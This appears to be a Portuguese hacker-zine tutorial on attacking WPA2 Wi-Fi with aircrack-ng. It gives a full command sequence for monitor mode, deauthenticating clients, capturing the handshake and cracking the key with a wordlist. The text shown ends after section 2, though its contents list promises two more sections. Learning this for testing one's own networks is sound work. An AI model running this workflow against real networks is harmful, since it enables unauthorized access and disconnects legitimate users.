---
title: "0x06_Wi-Fi_Hacking_com_Aircrack"
author: "Brenno Miranda"
edition: "dmp 0x2"
translationKey: "zine_wifi_hacking"
---

## --[ Sumário
- 0 -> [Redes Sem Fio: O Éter é Público]
- 1 -> [Modos de Operação Wireless]
- 2 -> [Captura do Handshake WPA2]
- 3 -> [PoC: Cracking com wordlist]
- 4 -> [Encerramento e Créditos]

### 0 - Redes Sem Fio: O Éter é Público

E aí!

Diferente de redes cabeadas onde o tráfego fica confinado ao fio, sinais Wi-Fi se propagam pelo ar. Qualquer pessoa dentro do alcance pode capturar frames — e é exatamente isso que torna wireless hacking tão acessível e fascinante.

### 1 - Modos de Operação Wireless

Para capturar tráfego Wi-Fi, precisamos colocar nossa interface em modo monitor. Neste modo, o adaptador captura todos os frames no canal, não apenas os endereçados a ele.

### 2 - Captura do Handshake WPA2

O ataque clássico a WPA2 envolve capturar o 4-way handshake entre o AP e um cliente, e depois fazer bruteforce offline da PSK:

```bash
# 1. Matar processos que interferem
sudo airmon-ng check kill

# 2. Ativar modo monitor
sudo airmon-ng start wlan0

# 3. Escanear redes disponíveis
sudo airodump-ng wlan0mon

# 4. Focar no alvo e capturar handshake
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# 5. Deautenticar um cliente para forçar reconexão (em outro terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# 6. Cracking offline com wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```

_Figura 1. Workflow completo de captura e cracking WPA2._
